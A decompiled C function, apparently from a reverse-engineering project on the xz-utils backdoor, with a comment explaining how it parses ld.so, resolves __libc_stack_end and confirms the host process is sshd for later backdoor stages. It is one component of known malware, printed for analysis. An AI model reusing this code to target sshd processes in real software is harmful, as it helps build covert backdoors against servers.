// /home/kali/xzre-ghidra/xzregh/103CE0_main_elf_parse.c
// Function: main_elf_parse @ 0x103CE0
// Calling convention: __stdcall
// Prototype: BOOL __stdcall main_elf_parse(main_elf_t * main_elf)


/*
 * AutoDoc: Given a `main_elf_t` that already points at ld.so's ELF header, this routine parses the interpreter, looks up
 * `__libc_stack_end`, and then calls `process_is_sshd` to verify that the captured runtime really belongs to sshd. If the checks
 * pass it stores the resolved `__libc_stack_end` pointer back through `main_elf->__libc_stack_end`, giving later stages an easy
 * way to reach sshd's argument/environment block.
 */

#include "xzre_types.h"

BOOL main_elf_parse(main_elf_t *main_elf)

{
  elf_info_t *elf;
  BOOL BVar1;
  Elf64_Sym *pEVar2;
  uchar *puVar3;
  void **libc_stack_end_ptr;
  elf_info_t *dynamic_linker;
  Elf64_Sym *libc_stack_end_sym;
  
  BVar1 = elf_parse(main_elf->dynamic_linker_ehdr,main_elf->elf_handles->dynamic_linker);
  if ((BVar1 != FALSE) &&
     (pEVar2 = elf_symbol_get(main_elf->elf_handles->dynamic_linker,STR_libc_stack_end,
                              STR_GLIBC_2_2_5), pEVar2 != (Elf64_Sym *)0x0)) {
    elf = main_elf->elf_handles->dynamic_linker;
    puVar3 = elf->elfbase->e_ident + pEVar2->st_value;
    BVar1 = process_is_sshd(elf,*(u8 **)puVar3);
    if (BVar1 != FALSE) {
      *main_elf->__libc_stack_end = *(void **)puVar3;
      return TRUE;
    }
  }
  return FALSE;
}

